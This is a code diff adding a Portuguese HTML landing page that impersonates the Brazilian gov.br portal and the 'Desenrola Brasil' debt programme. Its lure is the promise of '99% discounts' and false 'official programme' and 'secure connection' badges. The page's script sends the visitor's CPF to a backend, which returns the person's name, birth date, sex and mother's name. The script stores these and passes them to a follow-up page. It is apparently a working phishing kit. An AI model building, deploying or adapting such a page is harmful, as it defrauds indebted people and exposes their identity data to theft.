@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Limpe seu Nome - Desenrola Brasil</title>
+    <!-- Google Ads -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18302482370"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){ dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'AW-18302482370');
+    </script>
+    <!-- TikTok Pixel -->
+    <script>
+    !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript";n.async=!0;n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+    ttq.load('DA9IHQBC77UBPDTVJ18G');
+    ttq.page();
+    }(window,document,'ttq');
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        /* ── gov.br top bar ── */
+        .govbr-header {
+            background: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 520px;
+            width: 100%;
+            align-self: center;
+        }
+
+        .govbr-logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: #1351B4;
+            letter-spacing: -1px;
+        }
+
+        .govbr-logo span {
+            color: #FFCD07;
+        }
+
+        .header-icons {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .header-icon-btn {
+            width: 36px;
+            height: 36px;
+            border: 1.5px solid #ccc;
+            border-radius: 50%;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 16px;
+            color: #555;
+        }
+
+        /* ── main card ── */
+        .main-wrap {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 0 24px;
+        }
+
+        .card {
+            background: #fff;
+            max-width: 520px;
+            width: 100%;
+            padding: 32px 28px 28px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-limpe {
+            width: 200px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .update-badge {
+            background: #f0f7f0;
+            border-left: 4px solid #2e7d32;
+            border-radius: 4px;
+            padding: 12px 16px;
+            font-size: 15px;
+            color: #1a1a1a;
+            line-height: 1.5;
+            text-align: left;
+            margin-bottom: 24px;
+            width: 100%;
+        }
+
+        .update-badge .check-icon {
+            margin-right: 4px;
+        }
+
+        .cpf-label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1a1a1a;
+            align-self: flex-start;
+            margin-bottom: 8px;
+        }
+
+        .cpf-input {
+            width: 100%;
+            border: 1.5px solid #bbb;
+            border-radius: 8px;
+            padding: 14px 16px;
+            font-size: 17px;
+            color: #333;
+            outline: none;
+            margin-bottom: 18px;
+            letter-spacing: 1px;
+            transition: border-color 0.2s;
+        }
+
+        .cpf-input:focus {
+            border-color: #1351B4;
+        }
+
+        .cpf-input::placeholder {
+            color: #bbb;
+            letter-spacing: 1px;
+        }
+
+        .btn-continuar {
+            width: 100%;
+            background: #1351B4;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            border: none;
+            border-radius: 30px;
+            padding: 16px;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.2s, transform 0.1s;
+            margin-bottom: 20px;
+        }
+
+        .btn-continuar:hover {
+            background: #0f3e8e;
+            transform: translateY(-1px);
+        }
+
+        .btn-continuar:active {
+            transform: translateY(0);
+        }
+
+        .btn-continuar:disabled {
+            background: #7a9fd4;
+            cursor: not-allowed;
+            transform: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            display: none;
+        }
+
+        .btn-continuar:disabled .spinner {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .info-box {
+            background: #dce8f8;
+            border-radius: 10px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            text-align: left;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .info-box .info-icon {
+            font-size: 20px;
+            color: #1351B4;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .info-box p {
+            font-size: 14.5px;
+            color: #1a1a1a;
+            line-height: 1.5;
+        }
+
+        .trust-row {
+            display: flex;
+            justify-content: center;
+            gap: 28px;
+            margin-bottom: 10px;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .rights-text {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+        }
+
+        /* ── gov.br footer ── */
+        .govbr-footer {
+            background: #071D41;
+            max-width: 520px;
+            width: 100%;
+            align-self: center;
+            padding: 20px 24px;
+            color: #fff;
+        }
+
+        .govbr-footer .footer-logo {
+            font-size: 26px;
+            font-weight: 900;
+            color: #fff;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
+        }
+
+        .govbr-footer .footer-logo span {
+            color: #FFCD07;
+        }
+
+        .govbr-footer .footer-license {
+            font-size: 12px;
+            color: #aabbd4;
+            line-height: 1.5;
+        }
+
+        .govbr-footer .footer-rights {
+            font-size: 12px;
+            color: #fff;
+            font-weight: 700;
+            margin-top: 4px;
+        }
+
+        /* error state */
+        .cpf-input.error {
+            border-color: #d32f2f;
+        }
+
+        .error-msg {
+            font-size: 12px;
+            color: #d32f2f;
+            align-self: flex-start;
+            margin-top: -14px;
+            margin-bottom: 14px;
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 18px 22px;
+            }
+            .logo-limpe {
+                width: 170px;
+            }
+        }
+    </style>
+<meta name="tiktok-developers-site-verification" content="cgRf1iQLMvO9KfzUrJPDKfsAbQ2ypE17" />
+  <script src="/static/js/pixel-loader.js"></script>
+</head>
+<body>
+
+    <!-- gov.br header -->
+    <div class="govbr-header">
+        <img src="/static/images/logo-portal.png" alt="gov.br" style="height:28px;">
+        <div class="header-icons">
+            <div class="header-icon-btn">&#9680;</div>
+            <div class="header-icon-btn">&#8635;</div>
+        </div>
+    </div>
+
+    <div class="main-wrap">
+        <div class="card">
+
+            <img
+                src="/static/images/programa-logo.png"
+                alt="Limpe seu Nome e Desenrola Brasil"
+                class="logo-limpe"
+            >
+
+            <div class="update-badge">
+                <span class="check-icon">✅</span>
+                <strong>ATUALIZADO</strong> - Informe seu CPF e clique em "Continuar" para renegociar suas dívidas com descontos de 99%
+            </div>
+
+            <label class="cpf-label" for="cpfInput">CPF</label>
+            <input
+                type="tel"
+                id="cpfInput"
+                class="cpf-input"
+                placeholder="000.000.000-00"
+                maxlength="14"
+                autocomplete="off"
+                inputmode="numeric"
+            >
+            <span class="error-msg" id="cpfError">CPF inválido. Verifique e tente novamente.</span>
+
+            <button class="btn-continuar" id="btnContinuar" onclick="submitCPF()">
+                <span id="btnText">Continuar</span>
+                <div class="spinner" id="btnSpinner"></div>
+            </button>
+
+            <div class="info-box">
+                <span class="info-icon">ℹ️</span>
+                <p>O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!</p>
+            </div>
+
+            <div class="trust-row">
+                <div class="trust-item">🔒 Conexão segura</div>
+                <div class="trust-item">🛡️ Programa oficial</div>
+            </div>
+            <p class="rights-text">Sistema de Renegociação — Todos os direitos reservados</p>
+
+        </div>
+    </div>
+
+    <!-- gov.br footer -->
+    <div class="govbr-footer">
+        <div class="footer-logo">gov<span>.</span>br</div>
+        <p class="footer-license">Todo o conteúdo deste site está publicado sob a licença</p>
+        <p class="footer-rights">Sistema de Renegociação — Todos os direitos reservados</p>
+    </div>
+
+    <script>
+        // CPF mask
+        document.getElementById('cpfInput').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length > 11) v = v.slice(0, 11);
+            if (v.length <= 3) {
+                e.target.value = v;
+            } else if (v.length <= 6) {
+                e.target.value = v.slice(0,3) + '.' + v.slice(3);
+            } else if (v.length <= 9) {
+                e.target.value = v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6);
+            } else {
+                e.target.value = v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6,9) + '-' + v.slice(9);
+            }
+            // hide error on type
+            document.getElementById('cpfError').style.display = 'none';
+            document.getElementById('cpfInput').classList.remove('error');
+        });
+
+        async function submitCPF() {
+            const raw = document.getElementById('cpfInput').value.replace(/\D/g, '');
+            if (raw.length !== 11) {
+                document.getElementById('cpfInput').classList.add('error');
+                document.getElementById('cpfError').textContent = 'CPF inválido. Verifique e tente novamente.';
+                document.getElementById('cpfError').style.display = 'block';
+                return;
+            }
+
+            const btn = document.getElementById('btnContinuar');
+            const btnText = document.getElementById('btnText');
+            btn.disabled = true;
+            btnText.textContent = 'Aguarde...';
+            document.getElementById('cpfError').style.display = 'none';
+
+            try {
+                const response = await fetch('/api/check_cpf', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cpf: raw })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Preserve UTM params and save customerData with real queried data
+                    localStorage.setItem('customerData', JSON.stringify({
+                        cpf: raw,
+                        nome: data.nome,
+                        nascimento: data.nascimento || '19/05/2003',
+                        sexo: data.sexo || 'M',
+                        mae: data.mae || ''
+                    }));
+                    const params = new URLSearchParams(window.location.search);
+                    params.set('cpf', raw);
+                    if (data.nome) params.set('nome', data.nome);
+                    if (data.nascimento) params.set('nasc', data.nascimento);
+                    window.location.href = '/atendimento?' + params.toString();
+                } else {
+                    btn.disabled = false;
+                    btnText.textContent = 'Continuar';
+                    document.getElementById('cpfInput').classList.add('error');
+                    document.getElementById('cpfError').textContent = data.error || 'Erro na consulta. Tente novamente.';
+                    document.getElementById('cpfError').style.display = 'block';
+                }
+            } catch (error) {
+                btn.disabled = false;
+                btnText.textContent = 'Continuar';
+                document.getElementById('cpfInput').classList.add('error');
+                document.getElementById('cpfError').textContent = 'Erro de conexão. Tente novamente.';
+                document.getElementById('cpfError').style.display = 'block';
+            }
+        }
+
+        // Allow Enter key
+        document.getElementById('cpfInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') submitCPF();
+        });
+    </script>
+
+</body>
+</html>
